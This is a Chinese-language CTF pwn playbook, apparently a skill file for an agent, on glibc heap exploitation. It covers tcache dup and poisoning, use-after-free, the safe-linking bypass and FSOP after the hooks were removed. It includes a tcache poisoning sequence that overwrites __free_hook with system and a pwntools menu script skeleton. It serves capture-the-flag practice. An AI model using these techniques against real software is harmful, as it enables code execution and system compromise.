---
name: pwn/heap-tcache
description: glibc 堆题：tcache dup / poisoning / UAF 的通用打法
when_to_use: 题目有 malloc/free/edit/show 菜单；glibc 2.27–2.35 的堆题
categories: [pwn]
keywords: [heap, tcache, uaf, double free, 堆, unsorted bin]
---
## 先摸清环境

```bash
checksec ./chal
ldd --version            # 或 strings libc.so.6 | grep 'GNU C Library'
```
- 2.26 起有 tcache；2.29 起 tcache double-free 有 key 校验；2.32 起 safe-linking（指针右移 12 位异或）。

## 四大原语

| 漏洞 | 打法 |
| --- | --- |
| UAF | free 后 edit → 改 fd 指针 → 分配到任意地址 |
| double free | 2.31 之前直接 tcache dup；之后要先改 key |
| off-by-one / null | 改 size 造 overlapping chunk，再 leak unsorted bin |
| 无 show | 用 `stdout` 的 `_IO_2_1_stdout_` 泄露，或 partial overwrite 打 `__free_hook` |

## 经典 tcache poisoning（2.27/2.31）

```python
add(0x60); add(0x60)
free(0); free(1); free(0)          # 2.31 需要先改 key 才能二次 free
edit(0, p64(target))               # tcache->next = target
add(0x60); add(0x60)               # 第二次拿到 target
```
`target` 指向 `__free_hook`（2.34 之前）或 `__malloc_hook`，写入 `system` 后 free 一个含 `/bin/sh` 的块。

## 2.32+ safe-linking

`fd = target ^ (chunk_addr >> 12)`，所以要先 leak 堆地址（show 一个 freed chunk 就能拿到）。

## 2.34+ hooks 被移除

改打 `_IO_list_all` / `_IO_2_1_stdout_` 的 vtable（FSOP），或者 house of apple / emma。

## 常用脚本骨架

```python
def add(sz, data=b''): p.sendlineafter(b'>', b'1'); p.sendlineafter(b'size', str(sz)); p.sendafter(b'data', data)
def free(i): p.sendlineafter(b'>', b'2'); p.sendlineafter(b'idx', str(i))
def show(i): p.sendlineafter(b'>', b'3'); p.sendlineafter(b'idx', str(i)); return p.recvline()
def edit(i, d): p.sendlineafter(b'>', b'4'); p.sendlineafter(b'idx', str(i)); p.sendafter(b'data', d)
```
